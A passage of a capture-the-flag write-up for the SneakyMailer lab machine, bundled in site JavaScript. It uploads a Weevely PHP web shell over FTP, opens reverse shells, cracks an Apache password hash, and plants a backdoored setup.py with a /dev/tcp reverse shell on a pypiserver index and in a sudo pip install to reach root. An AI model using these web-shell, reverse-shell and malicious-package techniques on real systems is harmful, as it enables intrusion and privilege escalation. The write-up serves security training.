Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxrwxr-x    8 0        1001         4096 Nov 08 15:39 dev\n226 Directory send OK.\nftp> ls dev\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        0            4096 May 26 18:52 css\ndrwxr-xr-x    2 0        0            4096 May 26 18:52 img\n-rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php\ndrwxr-xr-x    3 0        0            4096 May 26 18:52 js\ndrwxr-xr-x    2 0        0            4096 May 26 18:52 pypi\ndrwxr-xr-x    4 0        0            4096 May 26 18:52 scss\n-rwxr-xr-x    1 0        0           26523 May 26 19:58 team.php\ndrwxr-xr-x    8 0        0            4096 May 26 18:52 vendor\n226 Directory send OK.\n")),(0,a.kt)("p",null,"Before uploadign a PHP web shell, let's craft one:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ weevely generate cyfun agent.php\nGenerated 'agent.php' with password 'cyfun' of 744 byte size.\n")),(0,a.kt)("p",null,"Then let's uplaod it:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"ftp> cd dev\n250 Directory successfully changed.\nftp> put agent.php\n200 PORT command successful. Consider using PASV.\n150 Ok to send data.\n226 Transfer complete.\n744 bytes sent in 6.3e-05 seconds (11.3 Mbytes/s)\n")),(0,a.kt)("p",null,"Then let's connect to our webshell and use the ",(0,a.kt)("inlineCode",{parentName:"p"},"backdoor_reversetcp")," module\nto get a reverse shell because the webshell is quickly removed from the server:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ weevely http://dev.sneakycorp.htb/agent.php cyfun\n\n[+] weevely 4.0.1\n\n[+] Target:     www-data@sneakymailer:/var/www/dev.sneakycorp.htb/dev\n[+] Session:    /home/cyfun/.weevely/sessions/dev.sneakycorp.htb/agent_0.session\n[+] Shell:      System shell\n\n[+] Browse the filesystem or execute commands starts the connection\n[+] to the target. Type :help for more information.\n\nweevely> :backdoor_reversetcp 10.10.14.174 8080\nReverse shell connected, insert commands. Append semi-colon help to get the commands accepted.\n/bin/sh: 0: can't access tty; job control turned off\n$ id;\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n")),(0,a.kt)("h2",{id:"privilege-escalation-of-machine--from-www-data-to-developer"},"Privilege Escalation of Machine : from www-data to developer"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\nlow:x:1000:1000:,,,:/home/low:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nftp:x:107:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\npostfix:x:108:116::/var/spool/postfix:/usr/sbin/nologin\ncourier:x:109:118::/var/lib/courier:/usr/sbin/nologin\nvmail:x:5000:5000::/home/vmail:/usr/sbin/nologin\ndeveloper:x:1001:1001:,,,:/var/www/dev.sneakycorp.htb:/bin/bash\npypi:x:998:998::/var/www/pypi.sneakycorp.htb:/usr/sbin/nologin\n")),(0,a.kt)("p",null,"There are 2 users excluding roto that have a shell: low & developer."),(0,a.kt)("p",null,"Let's try the dev creds:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ su developer\nPassword: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C\n\nid\nuid=1001(developer) gid=1001(developer) groups=1001(developer)\n")),(0,a.kt)("p",null,"But the home directory of developer is ",(0,a.kt)("inlineCode",{parentName:"p"},"/var/www/dev.sneakycorp.htb"),"\nthe flag is not here."),(0,a.kt)("p",null,"We may look elsewhere."),(0,a.kt)("h2",{id:"privilege-escalation-of-machine--from-developer-to-low"},"Privilege Escalation of Machine : from developer to low"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"ls -lh /home\ntotal 8.0K\ndrwxr-xr-x 8 low   low   4.0K Jun  8 03:47 low\ndrwx------ 5 vmail vmail 4.0K May 19 21:10 vmail\n\nls -lhA /home/low\ntotal 40K\nlrwxrwxrwx 1 root root    9 May 19 21:09 .bash_history -> /dev/null\n-rw-r--r-- 1 low  low   220 May 14 05:46 .bash_logout\n-rw-r--r-- 1 low  low  3.5K May 14 05:46 .bashrc\ndrwxr-xr-x 3 low  low  4.0K May 16 03:34 .cache\ndrwx------ 3 low  low  4.0K May 14 13:21 .gnupg\ndrwxr-xr-x 3 low  low  4.0K May 16 03:37 .local\ndr-x------ 2 low  low  4.0K May 16 03:30 .pip\n-rw-r--r-- 1 low  low   807 May 14 05:46 .profile\ndrwxr-xr-x 2 low  low  4.0K Jun  8 03:47 .ssh\n-rwxr-x--- 1 root low    33 Nov  9 10:36 user.txt\ndrwxr-xr-x 6 low  low  4.0K May 16 03:33 venv\n")),(0,a.kt)("p",null,"We already saw 2 references to pypi, now there is a venv folder own by low\nand in ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," an account named pypi which has a home folder named\n",(0,a.kt)("inlineCode",{parentName:"p"},"/var/www/pypi.sneakycorp.htb"),"."),(0,a.kt)("p",null,"It seems the pe will go through venv/pypi."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"ls -lhA /var/www/pypi.sneakycorp.htb\ntotal 12K\n-rw-r--r-- 1 root root       43 May 15 14:29 .htpasswd\ndrwxrwx--- 2 root pypi-pkg 4.0K Nov  9 12:19 packages\ndrwxr-xr-x 6 root pypi     4.0K May 14 18:25 venv\n")),(0,a.kt)("p",null,"We can check the hash:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"cat /var/www/pypi.sneakycorp.htb/.htpasswd\npypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/\n")),(0,a.kt)("p",null,"Let's see the kind of hash:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ haiti '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/'\nMD5(APR) [HC: 1600]\nApache MD5 [HC: 1600]\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ john hash.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt --format=md5crypt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsoufianeelhaoui  (pypi)\n1g 0:00:00:27 DONE (2020-11-09 21:36) 0.03652g/s 130543p/s 130543c/s 130543C/s souhegan..souderton0\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession complete\n")),(0,a.kt)("p",null,"Let's add the new sub-domain to ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/hosts"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ cat /etc/hosts | grep sneak\n10.10.10.197 sneakycorp.htb dev.sneakycorp.htb pypi.sneakycorp.htb\n")),(0,a.kt)("p",null,"On port 80 we have the same website as for sneakycorp.htb but on port 8080\nwe can see an app called pypiserver. (",(0,a.kt)("a",{parentName:"p",href:"http://pypi.sneakycorp.htb:8080/"},"http://pypi.sneakycorp.htb:8080/"),")"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"}," Welcome to pypiserver!"),(0,a.kt)("p",{parentName:"blockquote"},"This is a PyPI compatible package index serving 0 packages."),(0,a.kt)("p",{parentName:"blockquote"},"To use this server with pip, run the following command:"),(0,a.kt)("pre",{parentName:"blockquote"},(0,a.kt)("code",{parentName:"pre"},"    pip install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...]\n")),(0,a.kt)("p",{parentName:"blockquote"},"To use this server with easy_install, run the following command:"),(0,a.kt)("pre",{parentName:"blockquote"},(0,a.kt)("code",{parentName:"pre"},"    easy_install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...]\n")),(0,a.kt)("p",{parentName:"blockquote"},"The complete list of all packages can be found ",(0,a.kt)("a",{parentName:"p",href:"http://pypi.sneakycorp.htb:8080/packages/"},"here")," or via the ",(0,a.kt)("a",{parentName:"p",href:"http://pypi.sneakycorp.htb:8080/simple/"},"simple")," index."),(0,a.kt)("p",{parentName:"blockquote"},"This instance is running version 1.3.2 of the ",(0,a.kt)("a",{parentName:"p",href:"https://pypi.org/project/pypiserver/"},"pypiserver")," software.")),(0,a.kt)("p",null,"We can connect to the package index () basic auth\nwith the cracked credentials ",(0,a.kt)("inlineCode",{parentName:"p"},"pypi")," / ",(0,a.kt)("inlineCode",{parentName:"p"},"soufianeelhaoui"),"."),(0,a.kt)("p",null,"But no package is indexed yet."),(0,a.kt)("p",null,"RTFM. Letr's read the ",(0,a.kt)("a",{parentName:"p",href:"https://pypi.org/project/pypiserver/#uploading-packages-remotely"},"Uploading Packages Remotely")," page\nof pypiserver documentation."),(0,a.kt)("p",null,"The first thing we will need to upload a package is ",(0,a.kt)("inlineCode",{parentName:"p"},"~/.pypirc"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-ini"},"[distutils]\nindex-servers = local\n\n[local]\nrepository: http://pypi.sneakycorp.htb:8080/\nusername: pypi\npassword: soufianeelhaoui\n")),(0,a.kt)("p",null,"And of course we will need ",(0,a.kt)("inlineCode",{parentName:"p"},"setup.py")," for setuptools."),(0,a.kt)("p",null,"Let's look at the ",(0,a.kt)("a",{parentName:"p",href:"https://python-packaging.readthedocs.io/en/latest/minimal.html"},"Minimal Structure")," required:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"cyfun/\n    cyfun/\n        __init__.py\n    setup.py\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"setup.py")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"from setuptools import setup\n\nsetup(name='cyfun',\n      version='0.1',\n      description='cyfun de mon pwnage',\n      url='https://pwn.by/cyfun',\n      author='cyfun',\n      author_email='cyfun@example.com',\n      license='MIT',\n      packages=['cyfun'],\n      zip_safe=False)\n")),(0,a.kt)("p",null,"Let's run ",(0,a.kt)("inlineCode",{parentName:"p"},"python setup.py sdist upload -r local")," to package it and upload\nit."),(0,a.kt)("p",null,"Then we can see the package cyfun indexed and removed a few seconds later.\nLet's add a backdoor in the package."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"from setuptools import setup\nimport os\nos.system(\"echo 'bash -i >&/dev/tcp/10.10.14.174/8080 0>&1' | /bin/bash\")\n\nsetup(name='cyfun',\n      version='0.1',\n      description='cyfun de mon pwnage',\n      url='https://pwn.by/cyfun',\n      author='cyfun',\n      author_email='cyfun@example.com',\n      license='MIT',\n      packages=['cyfun'],\n      zip_safe=False)\n")),(0,a.kt)("p",null,"Here we got a shell as low:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ low@sneakymailer:~$ id\nuid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)\n,111(bluetooth),119(pypi-pkg)\n\nlow@sneakymailer:~$ cat user.txt\n70ac4f2e6be3aece2eed49ecb6f80d7d\n")),(0,a.kt)("h2",{id:"privilege-escalation-of-machine--from-low-to-root"},"Privilege Escalation of Machine : from low to root"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ printf %s 'ssh-rsa <pubkey> cyfun@penarch' >> ~/.ssh/authorized_keys\n$ ssh -i ~/.ssh/id_rsa low@10.10.10.197\n")),(0,a.kt)("p",null,"Let's look for low hanging fruits:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"low@sneakymailer:~$ sudo -l\nsudo: unable to resolve host sneakymailer: Temporary failure in name resolution\nMatching Defaults entries for low on sneakymailer:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser low may run the following commands on sneakymailer:\n    (root) NOPASSWD: /usr/bin/pip\n")),(0,a.kt)("p",null,"Let's create a very minimal backdoored package:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"low@sneakymailer:~$ mktemp -d\n/tmp/tmp.lIuPOXEbwZ\nlow@sneakymailer:~$ cd /tmp/tmp.lIuPOXEbwZ\nlow@sneakymailer:/tmp/tmp.lIuPOXEbwZ$ vim.tiny setup.py\nlow@sneakymailer:/tmp/tmp.lIuPOXEbwZ$ sudo /usr/bin/pip3 install \n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"setup.py")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"import os\nos.system(\"echo 'bash -i >&/dev/tcp/10.10.14.174/8080 0>&1' | /bin/bash\")\n")),(0,a.kt)("p",null,"When executed we retrieve the root shell:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"root@sneakymailer:/tmp/pip-req-build-lp_bvi48# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@sneakymailer:/tmp/pip-req-build-lp_bvi48# cd\nroot@sneakymailer:~# cat root.txt\n602b7d042c33e19fdf079cfef493eb60\nroot@sneakymailer:~# cat /etc/shadow | grep root\nroot:$6$jJW2Iy0Knfw7c6gr$/p2MAEhr7Fy4bMIT8szzgnSkL2kp8EaPKvGQ//cfcX0bMnazYHzNwWIsGaGwgceFyftI2Xihj0rrhUbfkrzhf.:18402:0:99999:7:::\n")))}d.isMDXComponent=!0},15971:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/sneakymailer-4819786f3192cc6b7573817c5a0ef257.png"}}]);